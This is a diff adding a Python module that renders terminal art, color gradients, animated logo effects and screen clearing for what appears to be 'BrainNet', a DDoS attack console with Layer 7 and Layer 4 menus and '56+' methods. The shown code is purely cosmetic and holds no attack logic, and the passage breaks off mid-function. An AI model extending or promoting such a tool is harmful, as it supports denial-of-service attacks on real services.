@@ -1,0 +1,1831 @@
+# -*- coding: utf-8 -*-
+"""
+RAIN Console Art Engine
+==========================
+- Automatic Windows / Linux terminal color activation (ANSI / VT)
+- Main screen art banner + rain effect where the logo art pours down on entry (not digits/letters)
+- 'Paragraph-by-paragraph' effect when an attack starts (typewriter + paragraph cascade output)
+- Real-time status bar updated every second during an attack
+- Interactive main menu (attack wizard / tools console / direct command execution)
+
+This module is imported and used by start.py.
+When run standalone (python ddos_art.py) it acts as an effect preview demo.
+"""
+import os
+import sys
+import time
+import shutil
+import ctypes
+import subprocess
+
+
+# ---------------------------------------------------------------------------
+# ANSI color constants
+# ---------------------------------------------------------------------------
+class C:
+    R = "\x1b[91m"     # bright red
+    G = "\x1b[92m"     # bright green
+    Y = "\x1b[93m"     # bright yellow
+    B = "\x1b[94m"     # bright blue
+    M = "\x1b[95m"     # bright magenta
+    CY = "\x1b[96m"    # bright cyan
+    W = "\x1b[97m"     # bright white
+    DIM = "\x1b[2m"
+    BOLD = "\x1b[1m"
+    UND = "\x1b[4m"
+    REV = "\x1b[7m"
+    RST = "\x1b[0m"
+
+
+# Rainbow-family color cycle used for banners
+RAINBOW = [C.M, C.CY, C.W, C.CY, C.G, C.Y, C.R, C.M]
+
+
+# ---------------------------------------------------------------------------
+# Art source
+#   MAIN_ART : hand-made double-line box (╔═╗) style (3 rows)
+#   others   : generated with pyfiglet (font: slant)
+# ---------------------------------------------------------------------------
+MAIN_ART = """                                            ╔═╗ ╔═╗ ╔═╗ ╔╗╔
+                                            ╠═╝ ╠═╣  ║  ║ ║
+                                            ║ ║ ╩ ╩ ╚═╝ ╝╚╝
+"""
+
+ATTACK_ART = """    ___  _______________   ________ __
+   /   |/_  __/_  __/   | / ____/ //_/
+  / /| | / /   / / / /| |/ /   / ,<
+ / ___ |/ /   / / / ___ / /___/ /| |
+/_/  |_/_/   /_/ /_/  |_\\____/_/ |_|
+"""
+
+FINISH_ART = """    ___________   ___________ __  __
+   / ____/  _/ | / /  _/ ___// / / /
+  / /_   / //  |/ // / \\__ \\/ /_/ /
+ / __/ _/ // /|  // / ___/ / __  /
+/_/   /___/_/ |_/___//____/_/ /_/
+"""
+
+# Dedicated banners for sub screens (when a menu item is selected)
+LAYER7_ART = """    __    _____  ____________     _____
+   / /   /   \\ \\/ / ____/ __ \\   /__  /
+  / /   / /| |\\  / __/ / /_/ /_____/ /
+ / /___/ ___ |/ / /___/ _, _/_____/ /
+/_____/_/  |_/_/_____/_/ |_|     /_/
+"""
+
+LAYER4_ART = """    __    _____  ____________        __ __
+   / /   /   \\ \\/ / ____/ __ \\      / // /
+  / /   / /| |\\  / __/ / /_/ /_____/ // /_
+ / /___/ ___ |/ / /___/ _, _/_____/__  __/
+/_____/_/  |_/_/_____/_/ |_|        /_/
+"""
+
+TOOLS_ART = """  __________  ____  __   _____
+ /_  __/ __ \\/ __ \\/ /  / ___/
+  / / / / / / / / / /   \\__ \\
+ / / / /_/ / /_/ / /______/ /
+/_/  \\____/\\____/_____/____/
+"""
+
+METHODS_ART = """    __  _________________  ______  ____  _____
+   /  |/  / ____/_  __/ / / / __ \\/ __ \\/ ___/
+  / /|_/ / __/   / / / /_/ / / / / / / /\\__ \\
+ / /  / / /___  / / / __  / /_/ / /_/ /___/ /
+/_/  /_/_____/ /_/ /_/ /_/\\____/_____//____/
+"""
+
+EXPERT_ART = """    _______  __ ____  __________  ______
+   / ____/ |/ // __ \\/ ____/ __ \\/_  __/
+  / __/  |   // /_/ / __/ / /_/ / / /
+ / /___ /   |/ ____/ /___/ _, _/ / /
+/_____//_/|_/_/   /_____/_/ |_| /_/
+"""
+
+
+# ---------------------------------------------------------------------------
+# Brain-style logo & panel -- reproduces the reference screens (brain1 / brain2)
+# ---------------------------------------------------------------------------
+BRAIN_ART = r""" ____  _____            _____ _   _ 
+|  _ \|  __ \     /\   |_   _| \ | |
+| |_) | |__) |   /  \    | | |  \| |
+|  _ <|  _  /   / /\ \   | | | . ` |
+| |_) | | \ \  / ____ \ _| |_| |\  |
+|____/|_|  \_\/_/    \_\_____|_| \_|
+"""
+
+BRAIN_HEADER_USER = "shavsheti"
+BRAIN_HEADER = ("shavsheti  [ ]  DISCORD:  braindevs.  [ ]  Power Upgraded .  New Design!")
+BRAIN_TAGLINE = "Progress, not perfection."
+BRAIN_WELCOME_1 = "Welcome To The Start Screen Of BrainNetv5.0"
+BRAIN_WELCOME_2 = "Powered By Brainv9 , Ran by Gecko"
+BRAIN_DISCORD = "-  https://discord.gg/HsMBBPZAW  -"
+BRAIN_HELP = 'Type "help" For the list of commands'
+BRAIN_COPY = "Copyright © 2026 Brain all rights reserved"
+BRAIN_PROMPT_USER = "shavsheti"
+BRAIN_PROMPT_NAME = "Brain"
+
+
+_VERSION = "v2.4 SNAPSHOT"
+_METHOD_COUNT = "56+"
+
+# ---------------------------------------------------------------------------
+# Intro 'art rain' large logo -- this logo pours down instead of digits/letters
+# ---------------------------------------------------------------------------
+RAIN_ART = """
+
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::             -::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::*::     ::::::          ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ ::::::::::::::::::::    ::::::::::   -:::::    :::::::::::::::::::::  :::::::::::::::::::::::::::::::::::::::: 
+ ::::::::::::::::    ::::::::::::*    ::::::*   -::::::::::::::::::   :::::::     ::::::::::::::::::::::::::::: 
+ :::::::::::::::  *::::::::::::*    :::::::     :::::::::::::::::::      -::::::     *::::::::::::::::::::::::: 
+ ::::::::::::::   :::::::: ::::     :::::::     ::::::::::::::   -   :::::::::* ::::::::::::::::::::::::::::::: 
+ ::::::::::::::   :::::::  ::     :::::     ::::::::::::::   ::     ::::::::  :::::::::  ::::      :::::::::::: 
+ :::::::::::::::   *:-   :::     -    ::::::::::::::::::- ::::     :::::      ::::::     *:  *:    :::::::::::: 
+ :::::::::::::: -   :::::     :::    -::::::::::::::::- -::::      :::  --   -:::   :      ::::    :::::::::::: 
+ :::::::::::::::::::::::::     :::::     ::::::::                :::- ::    ::::::::     ::::     ::::::::::::: 
+ :::::::::     ::::::::::    -:::::     *::::::   :  ::::::      ::::::     :::::::     ::::     ::::::*::::::: 
+ ::::::::   :::::::::::-    ::::::     ::::::  :::  :::::::     ::::::    ::::: -:    -::::     :::::  :::::::: 
+ :::::::   :::::::::::    -::::::     :::::  :::  ::::::::     ::::::    -::::  :     ::::     :::::  ::::::::: 
+ :::::::-  :::::::::    *::::::::     ::::::::  ::::::::-     :::  :-   -::   ::    ::::::    :::-   :::::::::: 
+ :::::::::   ::::    ::::::::::::::     :::   ::::::::*         *::::      ::::-   ::::::::       ::::::::::::: 
+ :::::::::::      ::::::::::::::::::::      :::::::::- :::::   ::::::::  *::::*  -::::::::::   -::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+ ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+ 
+"""
+
+# ---------------------------------------------------------------------------
+# Main screen 'art rain' settings
+# ---------------------------------------------------------------------------
+# Intro timing for the 'pour down once then stop' effect
+RAIN_DROP_SEC = 0.45          # First entry: drop time for the logo falling from the top (seconds)
+RAIN_REPEAT_DROP_SEC = 0.25   # Drop time when returning to main after an attack/task (seconds)
+RAIN_HOLD_SEC = 1.0           # First entry: hold time after landing with no movement (seconds)
+RAIN_REPEAT_HOLD_SEC = 0.5    # Hold time on return (seconds)
+RAIN_DROP_FPS = 40            # Drop effect frame rate
+
+# (old) cascade effect constants -- kept only for backward compatibility
+RAIN_FIRST_SEC = 2.6
+RAIN_REPEAT_SEC = 1.1
+RAIN_CHARS = "01ABCDEF#$%&@*+=^~[]{}|;:.,-_<>/\\"
+_RAIN_PLAYED = False     # Whether this is the first entry (for the main screen effect)
+
+# ---------------------------------------------------------------------------
+# Console initialization
+# ---------------------------------------------------------------------------
+_COLOR = True          # Whether color is used
+_INIT_DONE = False     # Whether initialization has run once
+
+
+# ---------------------------------------------------------------------------
+# Light blue -> sky blue gradient engine
+#   Paints all console output text with a "left-to-right
+#   light blue -> sky blue gradient". (256-color palette)
+#
+# How it works
+#   1) Split the text into lines, then for each line use the first/last visible character's
+#      position to pick a color number from a 48-step ramp by character position.
+#   2) Strip existing ANSI color codes and keep only style attributes
+#      (bold/dim/underline/reverse), then re-apply a 38;5;N code per character.
+#   3) Intercept print / input module-wide so they pass through this engine.
+# ---------------------------------------------------------------------------
+import re as _re
+import builtins as _b
+
+_GRAD_FROM = (60, 195, 255)     # sky blue (left end)
+_GRAD_TO = (255, 255, 255)      # white (right end)
+_GRAD_STEPS = 48                # number of ramp color steps
+
+_RAMP_CACHE = None              # lazy-computed color ramp cache
+
+
+def _near256(r, g, b):
+    """Return the xterm-256 color number (16-255) closest to (r,g,b)."""
+    best = 16
+    bd = None
+    for ri in range(6):          # 6x6x6 cube (0,95,135,175,215,255)
+        rv = 0 if ri == 0 else 55 + 40 * ri
+        for gi in range(6):
+            gv = 0 if gi == 0 else 55 + 40 * gi
+            for bi in range(6):
+                bv = 0 if bi == 0 else 55 + 40 * bi
+                d = (rv - r) ** 2 + (gv - g) ** 2 + (bv - b) ** 2
+                if bd is None or d < bd:
+                    bd, best = d, 16 + 36 * ri + 6 * gi + bi
+    for k in range(24):          # include the gray ramp 232-255 as candidates too
+        v = 8 + 10 * k
+        d = (v - r) ** 2 + (v - g) ** 2 + (v - b) ** 2
+        if d < bd:
+            bd, best = d, 232 + k
+    return best
+
+
+def _grad_ramp():
+    """Array of xterm-256 codes for the sky blue->white _GRAD_STEPS ramp (lazy + cached)."""
+    global _RAMP_CACHE
+    if _RAMP_CACHE is None:
+        n = max(1, _GRAD_STEPS - 1)
+        ramp = []
+        for i in range(_GRAD_STEPS):
+            t = i / float(n)
+            r = int(round(_GRAD_FROM[0] + (_GRAD_TO[0] - _GRAD_FROM[0]) * t))
+            g = int(round(_GRAD_FROM[1] + (_GRAD_TO[1] - _GRAD_FROM[1]) * t))
+            b = int(round(_GRAD_FROM[2] + (_GRAD_TO[2] - _GRAD_FROM[2]) * t))
+            ramp.append(_near256(r, g, b))
+        _RAMP_CACHE = ramp
+    return _RAMP_CACHE
+
+
+def _sgr_state(params, st):
+    """Parse SGR parameters (list of ints) and update the style state dict.
+
+    All color-related codes (30-37/40-47/90-97/100-107/38/48) are discarded
+    and only bold(1)/dim(2)/underline(4)/reverse(7) styles are kept.
+    """
+    i, n = 0, len(params)
+    while i < n:
+        p = params[i]
+        if p == 0:
+            st.update(bold=False, dim=False, under=False, rev=False)
+        elif p == 1:
+            st["bold"] = True
+        elif p == 2:
+            st["dim"] = True
+        elif p == 22:
+            st["bold"] = False
+            st["dim"] = False
+        elif p in (4, 21):
+            st["under"] = True
+        elif p == 24:
+            st["under"] = False
+        elif p == 7:
+            st["rev"] = True
+        elif p == 27:
+            st["rev"] = False
+        elif p in (38, 48):          # extended color -- skip the following mode/value parameters too
+            if i + 1 < n and params[i + 1] == 5:
+                i += 2
+            elif i + 1 < n and params[i + 1] == 2:
+                i += 4
+        i += 1
+    return st
+
+
+def _attr_sgr(st, code):
+    """Build an SGR string containing style attributes + a gradient color code.
+    Always starts with '0' (reset) so the previous color does not leak."""
+    parts = ["0"]
+    if st.get("bold"):
+        parts.append("1")
+    if st.get("dim"):
+        parts.append("2")
+    if st.get("under"):
+        parts.append("4")
+    if st.get("rev"):
+        parts.append("7")
+    parts.append("38;5;%d" % code)
+    return "\x1b[" + ";".join(parts) + "m"
+
+
+_SGR_RE = _re.compile(r"\x1b\[[0-9;]*m")
+
+
+def _grad_line(line, ramp):
+    """Convert a single line of text into a left->right blue->white gradient string.
+
+    - If there is no visible character (blank line / only control sequences) the original is returned.
+    - Whitespace/control characters (\r etc.) are not painted, but internal spaces count toward
+      position calculation so the gradient flows naturally even across wide gaps.
+    """
+    if not line:
+        return line
+
+    # 1) Tokenize: (type, text) -- txt=plain char, sgr=style code, ctl=other control
+    toks = []
+    i, n = 0, len(line)
+    while i < n:
+        if line[i] == "\x1b" and i + 1 < n and line[i + 1] == "[":
+            j = i + 2
+            while j < n and not (0x40 <= ord(line[j]) <= 0x7E):
+                j += 1
+            if j >= n:                # ended without a terminator -- take the rest whole
+                j = n - 1
+            j += 1
+            raw = line[i:j]
+            toks.append(("sgr" if raw.endswith("m") else "ctl", raw))
+            i = j
+        else:
+            j = i
+            while j < n and not (line[j] == "\x1b" and j + 1 < n and line[j + 1] == "["):
+                j += 1
+            toks.append(("txt", line[i:j]))
+            i = j
+
+    # 2) Compute the position of the first/last visible (non-space) character
+    pos = 0
+    first = last = -1
+    for typ, txt in toks:
+        if typ != "txt":
+            continue
+        for ch in txt:
+            if ch != " " and ord(ch) >= 32 and ch != "\x7f":
+                if first < 0:
+                    first = pos
+                last = pos
+            pos += 1
+
+    if first < 0:                     # no visible character -> original text as-is
+        return line
+
+    span = last - first
+    out = []
+    pos = 0
+    st = {"bold": False, "dim": False, "under": False, "rev": False}
+    for typ, txt in toks:
+        if typ == "sgr":
+            params = [int(x) for x in txt[2:-1].split(";") if x != ""]
+            if not params:
+                params = [0]
+            _sgr_state(params, st)
+        elif typ == "ctl":
+            out.append(txt)           # keep control sequences such as cursor movement as-is
+        else:
+            for ch in txt:
+                if ch == " " or ord(ch) < 32 or ch == "\x7f":
+                    # unpainted char (space/control): keep only the style attribute if any
+                    if st.get("bold") or st.get("dim") or st.get("under") or st.get("rev"):
+                        out.append(_attr_only_sgr(st))
+                    out.append(ch)
+                else:
+                    if span <= 0:
+                        t = 0.5
+                    else:
+                        t = (pos - first) / float(span)
+                    idx = int(round(t * (_GRAD_STEPS - 1)))
+                    out.append(_attr_sgr(st, ramp[idx]))
+                    out.append(ch)
+                pos += 1
+
+    # Reset the color left on the last character so it does not affect the next output
+    out.append(C.RST)
+    return "".join(out)
+
+
+def _attr_only_sgr(st):
+    """SGR with style attributes only, no color (for styled spaces)."""
+    parts = ["0"]
+    if st.get("bold"):
+        parts.append("1")
+    if st.get("dim"):
+        parts.append("2")
+    if st.get("under"):
+        parts.append("4")
+    if st.get("rev"):
+        parts.append("7")
+    return "\x1b[" + ";".join(parts) + "m"
+
+
+def gradientize(text):
+    """Convert text into a sky blue->white gradient string.
+
+    - If color is disabled (_COLOR=False) or there is no visible character, the input is returned as-is.
+    - The gradient is applied per line (split on \n), so every line runs from sky blue at the left
+      to white at the right end.
+    """
+    if not text or not _COLOR:
+        return text
+    if "\n" not in text:
+        return _grad_line(text, _grad_ramp())
+    ramp = _grad_ramp()
+    return "\n".join(_grad_line(ln, ramp) for ln in text.split("\n"))
+
+
+def _gprint(*args, sep=" ", end="\n", file=None, flush=False):
+    """Replacement print that applies the gradient to all print output."""
+    stream = sys.stdout if file is None else file
+    text = sep.join(str(a) for a in args)
+    stream.write(gradientize(text + end))
+    if flush:
+        stream.flush()
+
+
+def _ginput(prompt=""):
+    """Replacement input that applies the gradient to the prompt text too."""
+    return _b.input(gradientize(prompt))
+
+
+# Replace the module-wide print / input with the gradient versions
+# (a print() call inside a function resolves this module global at run time,
+#  so it applies equally to functions defined before this declaration.)
+print = _gprint
+input = _ginput
+
+
+def init():
+    """Enable VT (ANSI) processing on the Windows console and decide whether color is supported."""
+    global _COLOR, _INIT_DONE
+    if _INIT_DONE:
+        return _COLOR
+    _INIT_DONE = True
+
+    if os.environ.get("NO_COLOR"):
+        _COLOR = False
+        return _COLOR
+
+    if os.name == "nt":                      # Windows: cmd / powershell
+        try:
+            k32 = ctypes.windll.kernel32
+            out = k32.GetStdHandle(-11)      # STD_OUTPUT_HANDLE
+            mode = ctypes.c_uint32()
+            if k32.GetConsoleMode(out, ctypes.byref(mode)):
+                VT = 0x0004                  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
+                k32.SetConsoleMode(out, mode.value | VT)
+        except Exception:
+            pass
+
+    _COLOR = bool(sys.stdout and sys.stdout.isatty())
+    return _COLOR
+
+
+def is_color():
+    return _COLOR
+
+
+def paint(text, code, bold=False):
+    """Return the string wrapped in a color code. Returned as-is when color is unsupported."""
+    if not _COLOR:
+        return text
+    return f"{C.BOLD if bold else ''}{code}{text}{C.RST}"
+
+
+class _COORD(ctypes.Structure):
+    _fields_ = [("X", ctypes.c_short), ("Y", ctypes.c_short)]
+
+
+class _SMALL_RECT(ctypes.Structure):
+    _fields_ = [("Left", ctypes.c_short), ("Top", ctypes.c_short),
+                ("Right", ctypes.c_short), ("Bottom", ctypes.c_short)]
+
+
+class _CONSOLE_SCREEN_BUFFER_INFO(ctypes.Structure):
+    _fields_ = [("dwSize", _COORD),
+                ("dwCursorPosition", _COORD),
+                ("wAttributes", ctypes.c_ushort),
+                ("srWindow", _SMALL_RECT),
+                ("dwMaximumWindowSize", _COORD)]
+
+
+def _win_erase_console_buffer(handle=None):
+    """Windows-only: blank the WHOLE console screen buffer through the Win32 API.
+
+    The classic conhost does not honor ESC[3J (erase scrollback), so old output
+    can still be found by scrolling up. Filling every cell of the buffer with
+    spaces (what the cls command effectively does) removes all of it.
+    handle: optional console handle (defaults to the process stdout console).
+    Returns True when the wipe was performed.
+    """
+    try:
+        k32 = ctypes.windll.kernel32
+        k32.GetStdHandle.argtypes = [ctypes.c_ulong]
+        k32.GetStdHandle.restype = ctypes.c_void_p
+        k32.GetConsoleScreenBufferInfo.argtypes = [
+            ctypes.c_void_p, ctypes.POINTER(_CONSOLE_SCREEN_BUFFER_INFO)]
+        k32.GetConsoleScreenBufferInfo.restype = ctypes.c_int
+        out = handle if handle is not None else k32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
+        csbi = _CONSOLE_SCREEN_BUFFER_INFO()
+        if not k32.GetConsoleScreenBufferInfo(out, ctypes.byref(csbi)):
+            return False
+        total = csbi.dwSize.X * csbi.dwSize.Y     # visible area + scrolled-back lines
+        if total <= 0:
+            return False
+        written = ctypes.c_ulong(0)
+        home = _COORD(0, 0)
+        k32.FillConsoleOutputCharacterW.argtypes = [
+            ctypes.c_void_p, ctypes.c_wchar, ctypes.c_ulong,
+            _COORD, ctypes.POINTER(ctypes.c_ulong)]
+        k32.FillConsoleOutputCharacterW.restype = ctypes.c_int
+        k32.FillConsoleOutputAttribute.argtypes = [
+            ctypes.c_void_p, ctypes.c_ushort, ctypes.c_ulong,
+            _COORD, ctypes.POINTER(ctypes.c_ulong)]
+        k32.FillConsoleOutputAttribute.restype = ctypes.c_int
+        k32.SetConsoleCursorPosition.argtypes = [ctypes.c_void_p, _COORD]
+        k32.SetConsoleCursorPosition.restype = ctypes.c_int
+        # blank every cell of the entire buffer (scrollback included)
+        k32.FillConsoleOutputCharacterW(out, " ", total, home, ctypes.byref(written))
+        # restore the current color attribute on the blanked cells
+        k32.FillConsoleOutputAttribute(out, csbi.wAttributes, total,
+                                       home, ctypes.byref(written))
+        k32.SetConsoleCursorPosition(out, home)
+        return True
+    except Exception:
+        return False
+
+
+def clear_screen():
+    """Erase the visible screen AND the scrollback buffer, cursor to home.
+
+    ESC[2J clears the viewport, ESC[3J erases the saved (scrolled-back) lines --
+    together they remove every trace of previously printed output (e.g. a /help
+    listing) even when scrolling up. On Windows the Win32 buffer wipe is used as
+    well for consoles that ignore ESC[3J.
+    """
+    if _COLOR:
+        sys.stdout.write("\x1b[2J\x1b[3J\x1b[H")
+        sys.stdout.flush()
+        if os.name == "nt":
+            _win_erase_console_buffer()
+    else:
+        print("\n" * 3)
+
+
+# ---------------------------------------------------------------------------
+# Output effects
+# ---------------------------------------------------------------------------
+# Default inter-line flow delay (top->down cascade speed: 0.04s/line)
+_LINE_FLOW_DELAY = 0.04
+
+
+def typewrite(text, delay=None, end="\n"):
+    """Print line by line flowing from top to bottom (vertical cascade).
+
+    Previously each character was typed left->right, but now
+    the whole line appears at once and lines follow quickly downward in a
+    'top->down loading' fashion. All text is first painted with the
+    light blue->sky blue gradient.
+    """
+    if not text and not end:
+        return
+    if delay is None:
+        delay = _LINE_FLOW_DELAY
+    delay = max(0.006, float(delay or 0))
+    out = gradientize(text) + (end or "")
+    sys.stdout.write(out)
+    sys.stdout.flush()
+    if delay:
+        time.sleep(delay)
+
+
+def cascade(lines, delay=0.04, color=None, indent="", pause=0.0):
+    """Rapidly flow multiple lines from top to bottom (vertical cascade)."""
+    for ln in lines:
+        if color:
+            ln = paint(ln, color)
+        typewrite(indent + ln, delay=delay)
+        if pause:
+            time.sleep(pause)
+
+
+def pour(paragraphs, para_gap=0.16, char_delay=0.04, indent="  "):
+    """
+    'Paragraph-by-paragraph vertical cascade' output.
+
+    paragraphs : list of list[str]  (paragraph -> lines)
+    Lines flow downward, and when each paragraph ends it pauses briefly
+    before the next paragraph flows down. char_delay acts as the inter-line delay (seconds).
+    """
+    first = True
+    for para in paragraphs:
+        if not first:
+            time.sleep(para_gap)
+        first = False
+        if isinstance(para, str):
+            para = [para]
+        for ln in para:
+            typewrite(indent + ln, delay=max(0.008, char_delay))
+        print("", flush=True)
+
+
+def banner_rainbow(art, color_cycle=None, center=True):
+    """Paint each line of the art with a cycling rainbow color (centered by default)."""
+    cycle = color_cycle or RAINBOW
+    lines = art.rstrip("\n").split("\n")
+    if center:
+        lines = _center_art_lines(lines)
+    out = []
+    for i, ln in enumerate(lines):
+        if ln.strip():
+            out.append(paint(ln, cycle[i % len(cycle)], bold=True))
+        else:
+            out.append("")
+    return out
+
+
+def term_width():
+    try:
+        return shutil.get_terminal_size((100, 24)).columns
+    except Exception:
+        return 100
+
+
+def _center_art_lines(lines):
+    """Strip the common leading indent from art lines and re-pad to center them."""
+    nonempty = [l for l in lines if l.strip()]
+    if not nonempty:
+        return lines
+    lead = min(len(l) - len(l.lstrip(" ")) for l in nonempty)
+    trimmed = [l[lead:] if l.strip() else "" for l in lines]
+    aw = max(_plain(l) for l in trimmed if l.strip())
+    pre = " " * max(0, (term_width() - aw) // 2)
+    return [pre + l if l.strip() else "" for l in trimmed]
+
+
+def _term_wh():
+    """Current terminal size (width, height). Safe defaults when it cannot be measured."""
+    try:
+        sz = shutil.get_terminal_size((100, 25))
+        w = max(30, min(sz.columns, 220))
+        h = max(10, min(sz.lines, 60))
+        return w, h
+    except Exception:
+        return 100, 25
+
+
+# ---------------------------------------------------------------------------
+# Art cascade (rain) -- logo art pouring down (replaces the digits/letters cascade)
+# ---------------------------------------------------------------------------
+def _art_rows(art):
+    """Turn the art source into a normalized list of lines with equal width."""
+    lines = art.rstrip("\n").split("\n")
+    rows = [ln.rstrip() for ln in lines]
+    while rows and not rows[0].strip():
+        rows.pop(0)
+    while rows and not rows[-1].strip():
+        rows.pop()
+    if not rows:
+        return []
+    width = max(len(ln) for ln in rows)
+    return [ln + " " * (width - len(ln)) for ln in rows]
+
+
+def _shrink_half(row):
+    """Compress 2 columns into 1 half-block (used only when the art is wider than the terminal)."""
+    chars = []
+    i = 0
+    while i + 1 < len(row):
+        a, b = row[i], row[i + 1]
+        if a == " " and b == " ":
+            chars.append(" ")
+        elif a == "\u2588" and b == "\u2588":
+            chars.append("\u2588")
+        elif a == "\u2588":
+            chars.append("\u258c")     # ▌ left half block
+        else:
+            chars.append("\u2590")     # ▐ right half block
+        i += 2
+    if i < len(row):
+        chars.append(row[i])
+    return "".join(chars)
+
+
+def art_rain(seconds=2.0, fps=14, art=None, palette=None):
+    """
+    A cascade effect where logo art filling the whole screen pours from top to bottom.
+
+    Instead of the old digits/letters rain, RAIN_ART (█ block logo)
+    flows down as an endlessly connected vertical curtain. Colors cycle per line, and
+    if the screen is narrower than the art it auto-compresses to half blocks (▌▐) to prevent wrapping.
+
+    Does nothing unless color/a real terminal, and if the terminal cannot render block
+    characters (█ etc.) it falls back to the old digit rain (matrix_rain).
+    """
+    if not (_COLOR and sys.stdout and sys.stdout.isatty()):
+        return
+    if seconds <= 0:
+        return
+    if art is None:
+        art = RAIN_ART
+    if not art or not art.strip():
+        return
+
+    # fall back to the old digit rain if block characters (█▌▐) are unavailable
+    if not _wide_ok():
+        return matrix_rain(seconds, fps=min(int(fps), 30))
+
+    rows = _art_rows(art)
+    if not rows:
+        return
+    n_rows = len(rows)
+
+    W, H = _term_wh()
+    H = max(6, H - 1)              # reserve the bottom line
+
+    aw = len(rows[0])
+    if aw >= W:                    # compress to half blocks if the art is wider than the screen
+        rows = [_shrink_half(r) for r in rows]
+        aw = len(rows[0])
+    if aw > W:
+        rows = [r[:W] for r in rows]   # still too wide: truncate (prevents wrapping)
+        aw = W
+    lead = " " * ((W - aw) // 2) if aw < W else ""   # center on screen
+
+    palette = palette or RAINBOW
+    # Blue->white gradient: apply the left->right ramp independently per line.
+    # The old rainbow cycled line colors, but now every line uses the same blue->white theme.
+    # The source art has no SGR, so prepend bold (ESC[1m) to preserve weight.
+    colored = [gradientize("\x1b[1m" + r) for r in rows]
+
+    hide = "\x1b[?25l"
+    show = "\x1b[?25h"
+    erase = "\x1b[K"
+    step = 1.0 / max(1.0, float(fps))
+    next_tick = time.time()
+    deadline = next_tick + seconds
+    top = 0
+
+    sys.stdout.write(hide)
+    try:
+        while True:
+            if time.time() >= deadline:
+                break
+            # push the art tape down one line at a time and redraw the whole screen
+            lines_out = []
+            for y in range(H):
+                r = (top + y) % n_rows
+                lines_out.append(lead + colored[r] + erase)
+            sys.stdout.write("\x1b[H" + "\n".join(lines_out))
+            sys.stdout.flush()
+            top = (top + 1) % n_rows
+            next_tick += step
+            delay = next_tick - time.time()
+            if delay > 0:
+                time.sleep(delay)
+    except KeyboardInterrupt:
+        pass                     # allow skipping the intro with Ctrl+C
+    finally:
+        sys.stdout.write("\x1b[2J\x1b[H" + show)
+        sys.stdout.flush()
+
+
+def art_drop(drop_sec=0.45, hold_sec=1.0, fps=None, art=None, palette=None):
+    """
+    Drop intro effect where the logo art (RAIN_ART) pours down once from
+    above the screen (out of view) and stops in place.
+
+    - Unlike the old cascade (art_rain) it does not keep flowing. After landing it
+      stops completely, holds for hold_sec seconds, then clears the screen.
+    - Rainbow colors cycle per line, and if the screen is narrower than the art it
+      auto-compresses to half blocks (▌▐) to prevent wrapping.
+    - Does nothing unless color/a real terminal, and if the terminal cannot render
+      characters (█ etc.) it falls back to the old digit rain (matrix_rain).
+    - Skipping with Ctrl+C clears the screen immediately.
+    """
+    if not (_COLOR and sys.stdout and sys.stdout.isatty()):
+        return
+    if drop_sec < 0 or hold_sec < 0:
+        return
+    if art is None:
+        art = RAIN_ART
+    if not art or not art.strip():
+        return
+
+    # fall back to the old digit rain if block characters (█▌▐) are unavailable
+    if not _wide_ok():
+        return matrix_rain(drop_sec + hold_sec, fps=min(int(fps or RAIN_DROP_FPS), 30))
+
+    rows = _art_rows(art)
+    if not rows:
+        return
+    n_rows = len(rows)
+
+    W, H = _term_wh()
+    H = max(6, H - 1)              # reserve the bottom line
+
+    aw = len(rows[0])
+    if aw >= W:                    # compress to half blocks if the art is wider than the screen
+        rows = [_shrink_half(r) for r in rows]
+        aw = len(rows[0])
+    if aw > W:
+        rows = [r[:W] for r in rows]   # still too wide: truncate (prevents wrapping)
+        aw = W
+    lead = ' ' * ((W - aw) // 2) if aw < W else ''
+
+    palette = palette or RAINBOW
+    # Blue->white gradient: apply the left->right ramp independently per line.
+    # The old rainbow cycled line colors, but now every line uses the same blue->white theme.
+    # The source art has no SGR, so prepend bold (ESC[1m) to preserve weight.
+    colored = [gradientize("\x1b[1m" + r) for r in rows]
+
+    step = 1.0 / max(1.0, float(fps or RAIN_DROP_FPS))
+
+    # Drop: the logo starts above the screen (-n_rows) and descends once to its landing position.
+    # The landing position is vertically centered when there is room, otherwise the very top.
+    y_end = max(0, (H - n_rows) // 2)
+    y_start = -n_rows
+    dist = max(1, y_end - y_start)
+
+    hide = "\x1b[?25l"
+    show = "\x1b[?25h"
+    erase = "\x1b[K"
+    dur = max(0.0, float(drop_sec))
+    t0 = time.time()
+
+    def draw(y):
+        """Redraw the whole screen to match the current logo position y."""
+        out = ["\x1b[H"]
+        for yy in range(H):
+            ri = yy - y
+            if 0 <= ri < n_rows:
+                out.append(lead + colored[ri] + erase)
+            else:
+                out.append(erase)
+        sys.stdout.write("\n".join(out))
+        sys.stdout.flush()
+
+    sys.stdout.write(hide)
+    try:
+        while True:
+            el = time.time() - t0
+            if dur <= 0 or el >= dur:
+                y = y_end
+            else:
+                p = el / dur
+                p = 1.0 - (1.0 - p) ** 3   # deceleration: fast at first, lands smoothly at the end
+                y = y_start + int(round(dist * p))
+            draw(y)
